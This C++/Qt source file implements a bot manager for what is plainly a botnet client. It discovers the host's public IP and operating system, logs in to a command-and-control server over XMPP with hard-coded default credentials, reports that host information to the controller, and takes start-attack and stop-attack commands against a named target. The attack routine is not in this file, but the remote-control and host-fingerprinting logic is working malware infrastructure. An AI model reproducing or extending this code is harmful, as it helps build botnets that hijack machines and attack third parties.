#include "botmanager.h"
#include "global.h"
#include "xmppclient.h"
#include "bot.h"
#include "storagemanager.h"
#include "getstatuscommand.h"
#include "getbotstatecommand.h"
#include "startattackcommand.h"
#include "stopattackcommand.h"
#include "botstateresponse.h"
#include "attackstartedresponse.h"
#include "attackstoppedresponse.h"
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrl>
#include <QNetworkInterface>
#include <QSysInfo>
#include <QTime>
#include <iostream>

BotManager *BotManager::instance()
{
    static BotManager manager;

    return &manager;
}

void BotManager::connectToCC()
{
    QString jid = StorageManager::readConfig("jid").toString();
    QString password = StorageManager::readConfig("password").toString();

    _xmppClient -> connectToServer(jid, password);
}


void BotManager::disconnectFromCC()
{
    _xmppClient -> disconnectFromServer();

    writeEvent("Desconectado de CC");
}

void BotManager::readyOnXmppClient()
{
    _bot -> setState(WaitingForCommand);

    writeEvent(QString("Conectado a CC como %1").arg(_xmppClient -> whoAmI()));
}

void BotManager::commandReceivedOnBot(Message *command)
{
    Message *response = 0;
    bool isValid = true;

    if(dynamic_cast<GetStatusCommand *>(command) ||
       dynamic_cast<GetBotStateCommand *>(command)) {
        response = new BotStateResponse;
        dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);

        writeEvent(QString("Recibido GET_BOT_STATE_CMD [1:1] de %1").arg(command -> from()));
        writeEvent(QString("Enviado BOT_STATE_RES [1:1] con (id: %1 ip: %2 os: %3 estado: %4 attackId: %5 target: %6) a %7")
                   .arg(_bot -> id())
                   .arg(_bot -> ip())
                   .arg(_bot -> os())
                   .arg(_bot -> state())
                   .arg(_bot -> attack().id())
                   .arg(!_bot -> attack().target().isEmpty() ? _bot -> attack().target() : "-")
                   .arg(command -> from()));
    } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
        response = new AttackStartedResponse(startAttackCommand -> id());

        writeEvent(QString("Recibido START_ATTACK_CMD [1:%1] de %2 con (id: %3 target: %4)")
                   .arg(!command -> to().isEmpty() ? "1" : "N")
                   .arg(startAttackCommand -> from())
                   .arg(startAttackCommand -> id())
                   .arg(startAttackCommand -> target()));

        _bot -> setState(AttackInProgress);
        _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));

        writeEvent(QString("Iniciando ataque (id: %1 target: %2)")
                   .arg(_bot -> attack().id())
                   .arg(_bot -> attack().target()));
        writeEvent(QString("Enviado ATTACK_STARTED_RES [1:1] a %1").arg(command -> from()));
    } else if(dynamic_cast<StopAttackCommand *>(command)) {
        response = new AttackStoppedResponse(command -> id());

        writeEvent(QString("Recibido STOP_ATTACK_CMD [1:N] de %1").arg(command -> from()));
        writeEvent(QString("Parando ataque (id: %1 target: %2)")
                   .arg(_bot -> attack().id())
                   .arg(_bot -> attack().target()));

        _bot -> setState(WaitingForCommand);
        _bot -> setAttack(Attack());

        writeEvent(QString("Enviado ATTACK_STOPPED_RES [1:1] a %1").arg(command -> from()));
    } else
        isValid = false;

    if(isValid) {
        response -> setTo(command -> from());
        _xmppClient -> sendResponse(*response);
    }

    delete command;
}

void BotManager::finishedOnNetworkAccessManager(QNetworkReply *reply)
{
    QString ip;

    if(reply -> error() == QNetworkReply::NoError)
        ip = QString::fromLatin1(reply -> readAll());

    setupBot(ip);

    reply -> deleteLater();
}

BotManager::BotManager()
{
    _xmppClient = new XmppClient(APPLICATION_NAME);
    _xmppClient -> setParent(this);

    _bot = new Bot;

    _networkAccessManager = new QNetworkAccessManager(this);

    createConnections();

    setupConfig();
    sendHttpGetRequestToDiscoverIp();
}

BotManager::~BotManager()
{
    disconnectFromCC();

    delete _xmppClient;
    delete _bot;
}

void BotManager::createConnections()
{
    connect(_xmppClient, SIGNAL(ready()),
            this, SLOT(readyOnXmppClient()));
    connect(_xmppClient, SIGNAL(commandReceived(Message *)),
            this, SLOT(commandReceivedOnBot(Message *)));
    connect(_networkAccessManager, SIGNAL(finished(QNetworkReply *)),
            this, SLOT(finishedOnNetworkAccessManager(QNetworkReply *)));
}

void BotManager::setupConfig()
{
    if(!StorageManager::existsConfig() && StorageManager::createConfig()) {
        StorageManager::writeConfig("jid", "bot1@jabber.odyssey.net");
        StorageManager::writeConfig("password", "1234");
    }
}

void BotManager::setupBot(const QString& pubIp)
{
    QString ip = pubIp;

    if(ip.isNull()) {
        foreach(QHostAddress address, QNetworkInterface::allAddresses())
            if(address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6) {
                ip = address.toString();
                break;
            }
    }

    QString id = StorageManager::readConfig("jid").toString();
    QString os = QString("%1 %2").arg(QSysInfo::prettyProductName()).arg(QSysInfo::currentCpuArchitecture());

    _bot -> setId(id);
    _bot -> setIp(ip);
    _bot -> setOs(os);
    _bot -> setState(WaitingForCC);

    emit ready();
}

void BotManager::sendHttpGetRequestToDiscoverIp()
{
    _networkAccessManager -> get(QNetworkRequest(QUrl(IP_ADDRESS_API)));
}

void BotManager::writeEvent(const QString& event)
{
    std::cout << QString("[%1] %2").arg(QTime::currentTime().toString()).arg(event).toStdString() << std::endl;
}
